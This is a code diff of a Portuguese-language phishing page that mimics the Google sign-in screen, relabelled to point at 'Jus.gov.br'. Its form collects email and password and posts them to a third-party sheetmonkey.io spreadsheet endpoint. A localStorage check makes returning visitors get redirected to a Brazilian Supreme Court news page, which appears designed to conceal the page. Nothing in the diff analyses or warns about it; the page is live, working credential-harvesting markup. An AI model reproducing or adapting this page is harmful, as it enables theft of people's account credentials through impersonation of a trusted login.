@@ -10,13 +10,45 @@
             font-family: roboto, "Noto Sans Myanmar UI", arial, sans-serif;
         }
     </style>
+    
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="corpo">
+    <header class="cabeçalho">
+        <section style="margin: 6vw 0px 06px 0px;">
+            <h1 class="titulo1 t1">G</h1>
+            <h1 class="titulo2 t1">o</h1>
+            <h1 class="titulo3 t1">o</h1>
+            <h1 class="titulo1 t2">g</h1>
+            <h1 class="titulo5 t1">l</h1>
+            <h1 class="titulo2 t3">e</h1>
+            <p class="description"><b>FAZER LOGIN</b></p>
+            <p class="description2">Ir para o Jus.gov.br</p>
+            <p id="mail"></p>
+        </section>
+    </header>
+
+    <main class="meio">
+        <section class="section" style="margin: 6vw 0px 06px 0px;">
+            <form class="form" id="myForm" action="https://api.sheetmonkey.io/form/hGwJYdfvNf3Qq7Eq5Ki86k" method="POST">
+                <label class="tituloBoxMail">Email ou telefone</label>
+                <div id="DBmail2"></div>
+                <input id="Bmail" class="boxmail email" type="email" name="Email" required />
+                <input class="boxmail pass" type="password" name="Password" required />
+                <input type="hidden" name="Created" value="x-sheetmonkey-current-date-time" />
+                <input class="btn2" onclick="F2()" type="button" value="Avançar" />
+                <input class="btn" onclick="btnOver()" type="submit" value="Próximo" />
+            </form>
+            <a class="errpass" href="err-Gmail.html">Esqueceu seu email?</a>
+        </section>
+    </main>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script type="text/javascript">
         var acesso = 0;
         
         function carregou() {
             var verifyConect = localStorage.getItem("acesso");
-            if (acesso === verifyConect) {
+            if (acesso == verifyConect) {
                 $('body').remove();
                 setTimeout(() => {
                     window.location.replace("https://portal.stf.jus.br/noticias/verNoticiaDetalhe.asp?idConteudo=496265&ori=1");
@@ -55,36 +87,5 @@
             }, 2000);
         }
     </script>
-    <link rel="stylesheet" href="style.css">
-</head>
-<body class="corpo">
-    <header class="cabeçalho">
-        <section style="margin: 6vw 0px 06px 0px;">
-            <h1 class="titulo1 t1">G</h1>
-            <h1 class="titulo2 t1">o</h1>
-            <h1 class="titulo3 t1">o</h1>
-            <h1 class="titulo1 t2">g</h1>
-            <h1 class="titulo5 t1">l</h1>
-            <h1 class="titulo2 t3">e</h1>
-            <p class="description"><b>FAZER LOGIN</b></p>
-            <p class="description2">Ir para o Gmail</p>
-            <p id="mail"></p>
-        </section>
-    </header>
-
-    <main class="meio">
-        <section class="section" style="margin: 6vw 0px 06px 0px;">
-            <form class="form" id="myForm" action="https://api.sheetmonkey.io/form/hGwJYdfvNf3Qq7Eq5Ki86k" method="POST">
-                <label class="tituloBoxMail">Email ou telefone</label>
-                <div id="DBmail2"></div>
-                <input id="Bmail" class="boxmail email" type="email" name="Email" required />
-                <input class="boxmail pass" type="password" name="Password" required />
-                <input type="hidden" name="Created" value="x-sheetmonkey-current-date-time" />
-                <input class="btn2" onclick="F2()" type="button" value="Avançar" />
-                <input class="btn" onclick="btnOver()" type="submit" value="Próximo" />
-            </form>
-            <a class="errpass" href="err-Gmail.html">Esqueceu seu email?</a>
-        </section>
-    </main>
 </body>
 </html>
